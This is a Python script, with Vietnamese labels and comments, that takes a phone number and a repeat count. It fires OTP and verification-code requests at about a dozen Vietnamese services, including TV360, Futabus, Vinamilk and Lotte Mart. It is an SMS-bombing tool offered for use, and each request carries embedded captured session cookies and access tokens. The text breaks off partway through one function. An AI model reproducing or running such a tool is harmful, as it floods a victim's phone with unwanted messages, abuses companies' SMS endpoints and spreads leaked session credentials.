import requests
import time
import sys

sdt = sys.argv[1]
count = int(sys.argv[2])  # Lấy số lần từ tham số dòng lệnh

def sdtt(sdt):
    if sdt.startswith("0"):
        return "+84" + sdt[1:]
    return sdt

sdt_chuyen_doi = sdtt(sdt)

def tv360():
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk; shared-device-id=web_d113a986-bdb0-45cd-9638-827d1a7809bb; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; access-token=; refresh-token=; msisdn=; profile=; user-id=; session-id=s%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM; G_ENABLED_IDPS=google',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    try:
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TV360 | TRẠNG THÁI : THẤT BẠI")
    
def beautybox():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '79d2b3f19c99f5f7fe5971dd8a8da10d',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721481506061',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEAUTYBOX | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEAUTYBOX | TRẠNG THÁI : THẤT BẠI")
def kingfood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'AUh02gdJ2znItu66xz2_9BcBV9GpEJnBt2TLRjQR8E4oYUM8MOUaIzo9UIbYoR5iYCS1tFCgV-bXXo5aAhc4PphZgiMyaaKDNeC4MNyVDT5ME4_Sd-u0oY1gNPGS74QJAiRCJQ3aFU55oFpZpvKGID_msRlD:U=830229ce60000000',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    try:
        response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KINGFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KINGFOOD | TRẠNG THÁI : THẤT BẠI")

def batdongsan():
    cookies = {
        'con.ses.id': '7bf95af0-9d48-4115-b90e-bf7ae8469ee6',
        'con.unl.lat': '1721408400',
        'con.unl.sc': '1',
        '_cfuvid': '4vKd4xe7hwURYq2xLeT9BVK.Jrz4BnjQuSRDUOM0vzA-1721486111747-0.0.1.1-604800000',
        'cf_clearance': 'hiiEURQk2w.xUsuPjn9p3ROpbHXl.wlpUuq1cGtW_.g-1721486121-1.0.1.1-jbLYMcgpNKMTvY1HlNdTJzo8ICADE9v86yOh5Ulh15Xm.v0xqMTTlj15qkFRfERjSleLaNdqxOJCQTsz.cc7cA',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222072e9e1-089b-4e58-ae37-b33dc853a67e%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.6810435Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2264679f44-f457-480b-ad8d-ce4e4c2ee26d%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.681077Z%22%7D',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%22171c86d6-ae5f-e545-06ab-337ff9c892a2%22%2C%22c%22%3A1721486135674%2C%22l%22%3A1721486135674%7D',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'cookie': 'con.ses.id=7bf95af0-9d48-4115-b90e-bf7ae8469ee6; con.unl.lat=1721408400; con.unl.sc=1; _cfuvid=4vKd4xe7hwURYq2xLeT9BVK.Jrz4BnjQuSRDUOM0vzA-1721486111747-0.0.1.1-604800000; cf_clearance=hiiEURQk2w.xUsuPjn9p3ROpbHXl.wlpUuq1cGtW_.g-1721486121-1.0.1.1-jbLYMcgpNKMTvY1HlNdTJzo8ICADE9v86yOh5Ulh15Xm.v0xqMTTlj15qkFRfERjSleLaNdqxOJCQTsz.cc7cA; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222072e9e1-089b-4e58-ae37-b33dc853a67e%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.6810435Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2264679f44-f457-480b-ad8d-ce4e4c2ee26d%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.681077Z%22%7D; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22171c86d6-ae5f-e545-06ab-337ff9c892a2%22%2C%22c%22%3A1721486135674%2C%22l%22%3A1721486135674%7D',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.get(
            'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
            params=params,
            cookies=cookies,
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BATDONGSAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BATDONGSAN | TRẠNG THÁI : THẤT BẠI")

def futabus():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'priority': 'u=1, i',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImMxNTQwYWM3MWJiOTJhYTA2OTNjODI3MTkwYWNhYmU1YjA1NWNiZWMiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMTQ4NDE4NywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIxNDg0MTg3LCJleHAiOjE3MjE0ODc3ODcsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.B3N8aepeBJjblYxOhB3CWVrtNScR7v03lucgdln78cz2607XQDiYEOVWQ5ObwQkxfPrEEVrBNHeysfEffcXB0u2B2D6uEki1H1vKam3-ANzbMHQAuAHAsYdd8WJXaK-75tm4eQUtY9tkmdfbjTZqWY0J-_FylIIZ-KBTDIfxQObMFXdQvJNZ2eFwBFOG1-sV1z2xBLpzfHg94WwC21FAWGDh44UnrWoUTHHgUrUZH9y-y3SivWeln2Wl1VHoDjojJLq2ktO01JEmshb7K3zf9rloW8jTd-ZzHQzLEeqMbep8AUeqDslL7uHnz8AJ8V6udNxACirDi5dZ-4b6aj8uxA',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': '44099e14-f741-4900-892f-1e8d7634a953',
        'use_for': 'LOGIN',
    }

    try:
        response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FUTABUS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FUTABUS | TRẠNG THÁI : THẤT BẠI")

# def domino():
#     headers = {
#         'accept': 'application/json, text/plain, */*',
#         'accept-language': 'vi',
#         'content-type': 'application/json',
#         'dmn': 'DTPGDW',
#         'origin': 'https://dominos.vn',
#         'priority': 'u=1, i',
#         'referer': 'https://dominos.vn/?gad_source=1',
#         'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
#         'sec-ch-ua-mobile': '?0',
#         'sec-ch-ua-platform': '"Windows"',
#         'sec-fetch-dest': 'empty',
#         'sec-fetch-mode': 'cors',
#         'sec-fetch-site': 'same-origin',
#         'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
#         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
#     }

#     json_data = {
#         'phone_number': sdt,
#         'email': 'licehe9526@newcupon.com',
#         'type': 0,
#         'is_register': True,
#     }

#     response = requests.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data)
#     print(response.text)

# DOMINO LỖI 404:Bad Requests

def galaxyplay():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI2YzY0MTgxMi00OTk0LTQyN2EtOWU2Zi0zZjdkYjE4NDE3M2YiLCJkaWQiOiI5MjlmYWM4Zi1kMzIwLTQ4NGEtYjBlMi0zNzM3ZGFiYzc0MzAiLCJpcCI6IjE3MS4yMjQuMTc3LjI0OSIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8b3BlcmEiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNzIxNDg5MzMxLCJleHAiOjE3MzcwNDEzMzF9.BO2W7U4Y9QBrqv_Vhr34OlQ003dseXM5sOYsJPl1DK4',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GALAXYPLAY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GALAXYPLAY | TRẠNG THÁI : THẤT BẠI")

def hoangphuc():
    cookies = {
        'form_key': 'foYNoUTBeSb3u9Ky',
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'PHPSESSID': 'ac5e556aba621e003eea52e3ee2e7306',
        'form_key': 'foYNoUTBeSb3u9Ky',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-cache-sessid': 'true',
        'mst-cache-warmer-track': '1721490287753',
        'private_content_version': '49f632da2b3ba9baa44ac87e1acceb51',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=foYNoUTBeSb3u9Ky; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=ac5e556aba621e003eea52e3ee2e7306; form_key=foYNoUTBeSb3u9Ky; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1721490287753; private_content_version=49f632da2b3ba9baa44ac87e1acceb51',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6IjFkNWJkZWE3ODIzYTA1MmQiLCJ0ciI6IjNhZGMzYWRkODkyYzI1NzE2MjYxZTA1Mzg3NTI1OGRkIiwidGkiOjE3MjE0OTAzMTM0ODUsInRrIjoiMTMyMjg0MCJ9fQ==',
        'origin': 'https://hoang-phuc.com',
        'priority': 'u=1, i',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-3adc3add892c25716261e053875258dd-1d5bdea7823a052d-01',
        'tracestate': '1322840@nr=0-1-4173019-1120237972-1d5bdea7823a052d----1721490313485',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
    }

    try:
        response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOANGPHUC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOANGPHUC | TRẠNG THÁI : THẤT BẠI")

def gumac():
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GUMAC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUMAC | TRẠNG THÁI : THẤT BẠI")

def vinamilk():
    cookies = {
        'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e',
        '__cf_bm': 'eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ',
        'builderSessionId': 'b4ba9b33e12b4b4080e44f971f201bbd',
        'sca_fg_codes': '[]',
        'avadaIsLogin': '',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer null',
        'content-type': 'text/plain;charset=UTF-8',
        # 'cookie': 'ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e; __cf_bm=eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ; builderSessionId=b4ba9b33e12b4b4080e44f971f201bbd; sca_fg_codes=[]; avadaIsLogin=',
        'origin': 'https://new.vinamilk.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = f'{{"type":"register","phone":"{sdt}"}}'

    try:
        response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINAMILK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINAMILK | TRẠNG THÁI : THẤT BẠI")

def speedlotte():
    cookies = {
        '__Host-next-auth.csrf-token': '28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '__Host-next-auth.csrf-token=28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/vi-cgy',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'username': sdt,
        'case': 'register',
    }

    try:
        response = requests.post(
            'https://www.lottemart.vn/v1/p/mart/bos/vi_cgy/V1/mart-sms/sendotp',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SPEEDLOTTE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SPEEDLOTTE | TRẠNG THÁI : THẤT BẠI")

def medicare():
    cookies = {
        'SERVER': 'nginx2',
        'XSRF-TOKEN': 'eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0%3D',
        'medicare_session': 'eyJpdiI6Ii9Ma2NlZmZ1OVZPTDdxeitEOVVNT2c9PSIsInZhbHVlIjoiK0NhYXZtYjRBeHRwd1gvenMrblVGVEdrU0FKVW80bmptYnQvbHMzRzkvN1pyYjVmaEh3ZHdEYzlHb3V3djBvNjMyeTlKdUJzbTl0S2RwQkJwQkh0ejFrcEJXcnZUcGRDTEppdmp1MTJ6UDgzRk4zcUtKalpJVSt1RGhLdjd3OS8iLCJtYWMiOiI4ZjU1ZTZkNjc1NWM5Mjc3NjNkN2UxMTUzNWQ5YzUyYTY4N2I0NTQ1NTZiZWExOWViZjcwYjhmNWUxM2NlYjMyIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'SERVER=nginx2; XSRF-TOKEN=eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6Ii9Ma2NlZmZ1OVZPTDdxeitEOVVNT2c9PSIsInZhbHVlIjoiK0NhYXZtYjRBeHRwd1gvenMrblVGVEdrU0FKVW80bmptYnQvbHMzRzkvN1pyYjVmaEh3ZHdEYzlHb3V3djBvNjMyeTlKdUJzbTl0S2RwQkJwQkh0ejFrcEJXcnZUcGRDTEppdmp1MTJ6UDgzRk4zcUtKalpJVSt1RGhLdjd3OS8iLCJtYWMiOiI4ZjU1ZTZkNjc1NWM5Mjc3NjNkN2UxMTUzNWQ5YzUyYTY4N2I0NTQ1NTZiZWExOWViZjcwYjhmNWUxM2NlYjMyIiwidGFnIjoiIn0%3D',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
